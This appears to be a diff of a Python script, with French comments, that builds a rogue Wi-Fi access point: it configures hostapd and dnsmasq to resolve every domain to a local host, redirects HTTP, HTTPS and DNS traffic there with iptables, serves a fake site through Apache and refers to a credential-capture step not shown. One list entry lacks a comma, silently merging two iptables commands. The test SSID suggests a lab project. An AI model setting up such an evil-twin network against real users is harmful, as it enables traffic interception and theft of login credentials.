@@ -3,6 +3,7 @@ import subprocess
 import threading
 import shutil
 import time
+from src.rogue_ap.unconfig_rogue import *
 
 
 # Création du fichier de configuration Hostapd
@@ -13,7 +14,6 @@ ssid={essid}
 channel={channel}
 hw_mode=g
 auth_algs=1
-ieee80211n=1
 """
     with open("RogueAP/hostapd.conf", "w") as config_file:
         config_file.write(config_content)
@@ -24,13 +24,17 @@ ieee80211n=1
 def create_dnsmasq_conf(interface):
     config_content = f"""interface={interface}
 dhcp-range=192.168.1.20,192.168.1.80,12h
-dhcp-option=3,8.8.8.8
+dhcp-option=3,192.168.1.1
 dhcp-option=6,192.168.1.1
 address=/#/192.168.1.1
 """
     with open("RogueAP/dnsmasq.conf", "w") as config_file:
         config_file.write(config_content)
     print("[SUCCESS] : Fichier de configuration Dnsmasq créé avec succès.")
+    
+    os.system("sudo cp RogueAP/dnsmasq.conf /etc/dnsmasq.conf")
+    os.system("sudo chmod 644 /etc/dnsmasq.conf")
+    print("[SUCCESS] : Fichier de configuration Dnsmasq copié avec succès.")
 
 
 # Configuration des règles iptables
@@ -43,13 +47,18 @@ def iptables_conf(interface):
         "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
         
         # Autoriser le trafic venant de l'interface AP
-        f"sudo iptables -A FORWARD -i {interface} -j ACCEPT",
+        f"sudo iptables -A FORWARD -i {interface} -o eth0 -j ACCEPT",
+        "sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state ESTABLISHED,RELATED -j ACCEPT"
         
-        # Redirection du trafic HTTP (port 80) vers 192.168.1.1
-        "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1",
+        # Redirection du trafic HTTP (port 80) vers 192.168.1.1/index.php
+        "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80",
         
         # Redirection du trafic HTTPS (port 443) vers 192.168.1.1 (si besoin)
-        "sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1",
+        "sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443",
+        
+        # Redirection du trafic DNS (port 53) vers 192.168.1.1
+        "sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.1",
+        "sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 192.168.1.1",
     ]
 
     for command in commands:
@@ -82,6 +91,10 @@ def start_dnsmasq():
         print("[ERROR] : Échec du démarrage du service Dnsmasq.")
     else:
         print("[SUCCESS] : Service Dnsmasq démarré avec succès.")
+        if os.system("sudo systemctl enable dnsmasq") != 0:
+            print("[ERROR] : Échec de l'activation du service Dnsmasq.")
+        else:
+            print("[SUCCESS] : Service Dnsmasq activé avec succès.")
 
 
 #  Copie des fichiers du site web
@@ -107,8 +120,11 @@ def copy_webserver_files():
 
 # Lancer le serveur HTTP Python
 def start_http_server():
-    os.system("sudo systemctl restart apache2.service")
-    print("[SUCCESS] : Serveur HTTP démarré avec succès.")
+    # Redémarrer Apache
+    if os.system("sudo systemctl restart apache2.service") != 0:
+        print("[ERROR] : Échec du redémarrage du service Apache.")
+    else:
+        print("[SUCCESS] : Service Apache redémarré avec succès.")
 
 
 # Capture des données de connexion (identifiants)
@@ -177,3 +193,5 @@ if __name__ == "__main__":
     channel = "10"
     essid = "MonWifideTest"
     setup_rogue_ap(interface, channel, essid)
+    
+    unsetup_rogue_ap(interface)
